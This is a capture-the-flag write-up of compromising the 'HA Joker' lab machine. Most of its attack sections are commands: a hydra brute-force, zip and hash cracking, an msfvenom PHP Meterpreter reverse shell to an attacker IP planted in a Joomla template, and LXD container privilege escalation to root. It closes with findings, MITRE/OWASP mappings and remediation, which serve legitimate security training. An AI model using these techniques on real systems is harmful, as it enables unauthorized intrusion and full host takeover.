# HA Joker (Boot-to-Root, Joomla CMS Compromise)

**Category:** Offensive Security / Web Application & Privilege Escalation
**Difficulty:** Medium
**Skills demonstrated:** Web/service enumeration, sensitive-file disclosure identification, HTTP-auth brute-forcing, CMS reconnaissance, protected-archive cracking, database credential extraction, hash cracking, CMS template-based RCE, LXD group privilege escalation

---

## 1. Scenario

The target exposed SSH alongside two independent HTTP services on ports 80 and 8080. The engagement objective was a full boot-to-root compromise: identify the exposed web attack surface, obtain valid application credentials, achieve remote code execution against a Joomla CMS instance, and escalate from a low-privileged web service account to root by abusing group membership in the `lxd` group.

## 2. Objectives

1. Enumerate all exposed network services.
2. Identify and exploit sensitive information disclosure on the web services.
3. Obtain valid credentials for the CMS through brute-forcing and/or artifact recovery.
4. Achieve remote code execution via the CMS.
5. Identify and exploit a group-based local privilege escalation path.
6. Capture the final flag as proof of full compromise.

## 3. Reconnaissance

An initial full service scan was run against the target:

```bash
sudo nmap -A -vv -T4 -Pn <target-ip>
```

**Results:**

| Port | Service |
|---|---|
| 22 | SSH |
| 80 | HTTP |
| 8080 | HTTP (login-protected) |

With no credentials available for SSH at this stage, enumeration focused entirely on the two web services.

## 4. Enumeration — Port 80

Port 80 presented a themed static page with no authentication in place — an immediate signal to check for exposed content rather than assume the service was purely cosmetic. Directory/file discovery was run to identify hidden resources:

```bash
gobuster dir -u http://<target-ip> -w /usr/share/dirb/wordlists/common.txt -x txt,php,html,zip
```

This surfaced two notable findings:

- **`secret.txt`** — an unlisted text file containing information relevant to later stages of the engagement.
- **`phpinfo.php`** — a debug artifact left accessible in production, disclosing PHP configuration and environment details that should never be exposed externally.

## 5. Enumeration — Port 8080 and Credential Access

Port 8080 required authentication via HTTP Basic-style login. Given the challenge's thematic naming convention, `joker` was tested as a candidate username, and a password brute-force was run against it:

```bash
hydra -l joker -P /usr/share/wordlists/rockyou.txt <target-ip> -s 8080 http-get
```

This successfully recovered a valid password, granting access to the service, which was identified as a **Joomla** CMS instance.

## 6. Web Application Assessment — Nikto

With authenticated access available, Nikto was run against the CMS to identify further misconfigurations:

```bash
nikto -h http://<target-ip>:8080/ -id joker:<password>
```

**Findings:**

- A `robots.txt` file, disclosing paths not intended for search-engine indexing.
- An exposed `/administrator/` path redirecting to the Joomla admin login panel.
- A downloadable, password-protected **`backup.zip`** archive — a significant find, since backup archives frequently contain database dumps, configuration files, or credentials.

## 7. Cracking the Backup Archive

Since `backup.zip` was password-protected, its hash was extracted for offline cracking:

```bash
zip2john backup.zip > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

The recovered archive password matched the credentials already obtained via Hydra — a useful confirmation that password reuse was present across the environment, but not a strictly necessary step given the credentials were already known.

## 8. Extracting Joomla Super-User Credentials

The archive was extracted:

```bash
unzip backup.zip
```

Inside, a `db` directory contained a Joomla database export:

```bash
cd db
cat joomladb.sql
```

This SQL dump exposed the Joomla **super-user** account, including its username and a hashed password. The hash was cracked offline with John the Ripper, yielding valid super-user credentials for the Joomla administrator panel.

## 9. Remote Code Execution via Joomla Template Editing

With super-user access to the Joomla admin panel, the built-in template editor was used to achieve code execution — a well-known post-authentication RCE technique against Joomla, since template PHP files are directly served by the web server and editable from within the admin interface.

A PHP Meterpreter payload was generated:

```bash
msfvenom -p php/meterpreter/reverse_tcp lhost=<attacker-ip> lport=4445
```

**Steps taken:**

1. Navigated to `Extensions → Templates → beez3` in the Joomla admin panel.
2. Replaced the contents of `index.php` for that template with the generated payload.
3. Started a matching listener via `msfconsole`.
4. Requested the modified `index.php` directly to trigger execution.

This returned a Meterpreter session, which was converted to a fully interactive shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Verifying the shell's identity confirmed access as **`www-data`**.

## 10. Privilege Escalation Path Identification

Reviewing the current user's group memberships revealed inclusion in the **`lxd`** group — a well-documented Linux privilege-escalation vector, since LXD-managed containers can be configured to mount the host filesystem with elevated (root) access, and group membership alone is often sufficient to abuse this without requiring `sudo`.

## 11. Privilege Escalation via LXD

**Building a privileged container image (attacker machine):**

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
```

This produced a compressed Alpine Linux image (`.tar.gz`) suitable for import into the target's LXD instance.

**Transferring the image to the target:**

```bash
# Attacker machine
python -m http.server

# Target machine
cd /tmp
wget http://<attacker-ip>/alpine-v3.13-x86_64-*.tar.gz
```

**Importing and launching a privileged container with the host filesystem mounted:**

```bash
lxc image import alpine-v3.13-x86_64-*.tar.gz --alias myalpine
lxc init myalpine ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

Because the container was launched in **privileged** mode with the host's root filesystem (`/`) bind-mounted into it, any process inside the container effectively has full read/write access to the host as root — this is the core of the LXD group-membership escalation technique.

## 12. Capturing the Final Flag

Navigating the mounted host filesystem from within the privileged container:

```bash
cd /mnt/root/root
cat final.txt
```

This confirmed full root-equivalent access to the underlying host and completed the engagement.

## 13. Attack Chain Summary

```
Nmap recon → SSH (22), HTTP (80), HTTP-auth (8080)
      │
      ▼
Gobuster on port 80 → secret.txt + exposed phpinfo.php
      │
      ▼
Hydra brute-force ("joker" username) → valid credentials for port 8080
      │
      ▼
Nikto scan → robots.txt, /administrator/, backup.zip discovered
      │
      ▼
zip2john + John the Ripper → backup.zip password cracked (password reuse confirmed)
      │
      ▼
joomladb.sql extracted → Joomla super-user hash recovered
      │
      ▼
John the Ripper → super-user password cracked → Joomla admin access
      │
      ▼
Template editor (beez3/index.php) → msfvenom PHP payload → RCE as www-data
      │
      ▼
Shell stabilized → www-data found in "lxd" group
      │
      ▼
Alpine LXD image built, transferred, imported as privileged container
      │
      ▼
Host filesystem mounted into container → root-equivalent host access
      │
      ▼
final.txt captured
```

## 14. Vulnerability & Exploitation Assessment

| # | Finding | Severity | Root Cause |
|---|---|---|---|
| 1 | `phpinfo.php` exposed on a production web server | Medium | Debug/diagnostic file left accessible externally, disclosing environment configuration |
| 2 | Unlisted sensitive file (`secret.txt`) discoverable via brute-force directory enumeration | Medium | Reliance on obscurity instead of proper access control |
| 3 | Weak, wordlist-crackable HTTP authentication credentials | High | Absence of account lockout/rate limiting on port 8080 login |
| 4 | Downloadable, password-protected backup archive (`backup.zip`) publicly reachable | High | Sensitive backup data stored in a web-accessible location |
| 5 | Password reuse between the web login and the archive password | High | No enforcement of unique, non-reused credentials across systems |
| 6 | Joomla super-user password hash recoverable from an exposed database export | Critical | Database backups stored without encryption or access restriction |
| 7 | Joomla template editor allows direct PHP code execution for any super-user | Critical | Insecure-by-design CMS feature enabling authenticated RCE |
| 8 | Low-privileged service account (`www-data`) is a member of the `lxd` group | Critical | Over-privileged group membership enabling trivial root escalation |

## 15. MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Evidence |
|---|---|---|---|
| Reconnaissance | [T1595.001](https://attack.mitre.org/techniques/T1595/001/) | Active Scanning: Scanning IP Blocks | Nmap full port/service scan |
| Reconnaissance | [T1595.002](https://attack.mitre.org/techniques/T1595/002/) | Active Scanning: Vulnerability Scanning | Gobuster and Nikto content/vulnerability enumeration |
| Credential Access | [T1110.001](https://attack.mitre.org/techniques/T1110/001/) | Brute Force: Password Guessing | Hydra brute-force against the port 8080 login |
| Credential Access | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) | Unsecured Credentials: Credentials In Files | Joomla super-user credentials exposed in `joomladb.sql` inside `backup.zip` |
| Credential Access | [T1110.002](https://attack.mitre.org/techniques/T1110/002/) | Brute Force: Password Cracking | `zip2john`/John cracking the archive password and the Joomla password hash |
| Initial Access | [T1078](https://attack.mitre.org/techniques/T1078/) | Valid Accounts | Authenticated access to Joomla admin panel with recovered super-user credentials |
| Execution | [T1505.003](https://attack.mitre.org/techniques/T1505/003/) | Server Software Component: Web Shell | Joomla template `index.php` overwritten with a PHP Meterpreter payload |
| Discovery | [T1069.001](https://attack.mitre.org/techniques/T1069/001/) | Permission Groups Discovery: Local Groups | Identification of `www-data`'s membership in the `lxd` group |
| Privilege Escalation | [T1611](https://attack.mitre.org/techniques/T1611/) | Escape to Host | Privileged LXD container launched with the host filesystem bind-mounted, granting root-equivalent host access from a low-privileged group membership |

## 16. OWASP Top 10 Mapping (2021)

| OWASP Category | Relevance |
|---|---|
| **A05:2021 – Security Misconfiguration** | `phpinfo.php` left exposed, a password-protected but publicly downloadable backup archive, and a low-privileged account granted `lxd` group membership all reflect configuration failures across the stack |
| **A07:2021 – Identification and Authentication Failures** | Weak, wordlist-crackable credentials on the port 8080 login with no apparent rate limiting or lockout |
| **A02:2021 – Cryptographic Failures** | Joomla super-user password stored/exported as a crackable hash inside an unencrypted database backup |
| **A08:2021 – Software and Data Integrity Failures** | The Joomla template editor allowed direct, unrestricted modification of live, web-served PHP code by any super-user account |
| **A01:2021 – Broken Access Control** | Backup and diagnostic files (`backup.zip`, `phpinfo.php`) were reachable without any access restriction beyond directory-name obscurity |

## 17. Remediation Recommendations

| Finding | Recommendation |
|---|---|
| Exposed `phpinfo.php` | Remove diagnostic/debug files from all production deployments |
| Discoverable sensitive files via brute-force | Enforce proper authentication/authorization on all sensitive resources rather than relying on unpredictable filenames |
| Weak HTTP login credentials | Enforce strong password policy and add rate limiting/account lockout to all authentication endpoints |
| Publicly reachable backup archive | Store backups outside the web root, restrict access via network controls, and encrypt archive contents |
| Password reuse | Enforce unique credentials per system/service; deploy a password manager or SSO where feasible |
| Plaintext-recoverable CMS credentials in database exports | Encrypt backups at rest and in transit; restrict database export access to authorized administrators only |
| Joomla template editor RCE | Disable direct template file editing where not operationally required; apply file-integrity monitoring to template directories |
| `www-data` in `lxd` group | Remove unnecessary group memberships from service accounts; apply the principle of least privilege, and audit privileged group membership regularly (`lxd`, `docker`, `sudo`, etc.) |

## 18. Key Takeaways

- **Backup files are frequently the weakest link, not the CMS itself.** The path to the Joomla super-user account did not come from exploiting Joomla directly — it came from a forgotten, downloadable database backup sitting alongside the application.
- **Credential reuse multiplies the impact of a single leak.** Recovering one password (via brute-force) turned out to also unlock a supposedly separate, "protected" archive — a pattern that consistently expands the blast radius of otherwise-contained compromises.
- **CMS admin panels are effectively code-execution panels.** Any authenticated administrative access to a CMS with a template/plugin editor should be treated as equivalent to direct server access, since it almost always is.
- **Auxiliary group memberships deserve the same scrutiny as sudo rights.** Membership in groups like `lxd` or `docker` is easy to overlook during hardening reviews but is functionally equivalent to unrestricted root access.

## 19. Conclusion

This engagement demonstrates a realistic compromise chain built from cascading, individually moderate weaknesses: exposed diagnostic and backup files, weak and reused credentials, an administrative CMS feature that doubles as a code-execution primitive, and an over-privileged service account group membership. No single finding required a zero-day or highly sophisticated exploit — proper credential hygiene, backup handling, and privilege auditing would have broken this chain at multiple independent points.

